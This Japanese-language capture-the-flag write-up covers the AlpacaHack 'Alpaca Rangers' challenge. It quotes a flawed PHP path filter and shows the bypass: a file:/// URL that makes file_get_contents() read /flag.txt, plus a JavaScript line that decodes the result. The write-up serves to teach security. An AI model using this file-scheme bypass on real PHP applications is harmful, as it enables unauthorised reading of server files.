# Alpaca Rangers

https://alpacahack.com/daily/challenges/alpaca-rangers

## 問題の概要

URL のクエリパラメータに基づいて画像ファイルを読み込む PHP アプリケーションで、`/flag.txt` の内容を読み取って表示させる問題です。

`?img=red.png` のように指定したパスから読み込んだデータが Data URI として HTML に埋め込んで表示されます。

ただし、次のようなファイルパスの検査が行われています。

```php
if (str_starts_with($targetPath, '/') || str_starts_with($targetPath, '\\') || str_contains($targetPath, '..')) {
    $errorMessage = 'Invalid path.';
} else {
    $contents = @file_get_contents($targetPath);
    .....
}
```

アプリケーションのワーキングディレクトリは `/var/www/html/` で、フラグは `/flag.txt` に配置されています。

## 解法

`?img=/flag.txt` や `?img=./../../flag.txt` のように指定すると、ファイルパスの検査で弾かれてしまいます。

しかし、`file_get_contents()` は URL スキームもサポートしているため、`?img=file:///flag.txt` のように指定すると、ファイルパスの検査を回避してフラグを読み取ることができます。

## 実行手順

`?img=file:///flag.txt` を指定してページにアクセスすると、画像の `src` 属性にフラグの内容が Data URI として埋め込まれて表示されます。

DevTools のコンソールで次の JavaScript コードを実行して、フラグを抽出できます。

```javascript
atob($("img").src.split(",")[1]);
```
